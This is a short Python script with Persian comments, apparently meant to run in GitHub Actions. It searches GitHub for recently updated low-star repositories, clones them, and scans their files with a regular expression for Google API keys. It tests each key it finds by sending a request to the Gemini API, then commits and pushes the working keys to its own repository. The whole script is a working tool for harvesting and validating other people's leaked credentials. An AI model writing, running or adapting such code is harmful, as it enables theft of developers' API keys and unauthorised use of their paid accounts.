import requests
import re
import os
import subprocess

# تنظیمات اولیه گیت
subprocess.run(['git', 'config', 'user.name', 'github-actions'])
subprocess.run(['git', 'config', 'user.email', 'github-actions@github.com'])

REGEX = r'\bAQ\.[a-zA-Z0-9_-]{50}\b'
TARGET_EXTENSIONS = ('.env', '.py', '.json', '.yaml', '.yml', '.js', '.html', '.txt', '.conf')

def save_and_push(key):
    with open('active_api_keys.txt', 'a') as f:
        f.write(key + '\n')
    subprocess.run(['git', 'add', 'active_api_keys.txt'])
    subprocess.run(['git', 'commit', '-m', 'Found new active key'])
    subprocess.run(['git', 'push'])

# جستجوی هدفمند
query = "stars:0..10 (language:python OR language:javascript OR language:html)"
url = f'https://api.github.com/search/repositories?q={query}&sort=updated&order=desc'
repos = requests.get(url).json().get('items', [])

for repo in repos:
    repo_name = repo['name']
    subprocess.run(['git', 'clone', '--depth', '1', repo['clone_url'], repo_name])
    
    for root, _, files in os.walk(repo_name):
        if any(d in root for d in ['.git', 'node_modules', 'venv']): continue
        for file in files:
            if file.endswith(TARGET_EXTENSIONS):
                try:
                    with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        matches = re.findall(REGEX, content)
                        for match in set(matches):
                            # تست لحظه‌ای
                            resp = requests.post(f'https://generativelanguage.googleapis.com/v1beta/models/gemini-3.8-flash-lite:generateContent?key={match}', json={"contents": [{"parts": [{"text": "Hi."}]}]})
                            if resp.status_code == 200:
                                save_and_push(match)
                except: continue
    
    subprocess.run(['rm', '-rf', repo_name])
